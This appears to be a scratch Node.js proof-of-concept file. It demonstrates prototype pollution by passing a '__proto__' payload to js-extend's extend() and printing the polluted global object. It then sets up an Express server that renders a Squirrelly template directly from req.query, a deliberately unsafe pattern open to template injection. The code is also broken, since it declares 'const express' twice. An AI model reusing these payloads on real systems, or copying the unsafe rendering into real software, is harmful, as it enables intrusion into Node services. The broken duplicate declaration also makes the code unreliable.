var extend = require('js-extend').extend
const express = require('express')
var json_ptr = require('json-ptr')
// const app = express()

var jsExtend = require("js-extend")
var obj = {}
var malicious_payload = '{"__proto__":{"polluted":"Yes! Its Polluted"}}';
console.log("Before: " + {}.polluted);
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log("After : " + {}.polluted);

// app.get("/", async (req, res) => {
//     const html = await ejs.renderFile(__dirname + "/templates/index.ejs",{sentence});
//     res.end(html)
// })

const express = require('express')
const app = express()
const port = 3000
 
app.set('views', __dirname);
app.set('view engine', 'squirrelly')
app.use(express.urlencoded({ extended: false }));
app.get('/', (req, res) => {
   res.render('index.squirrelly', req.query)
})
 
app.listen(port, () => {})
module.exports = app;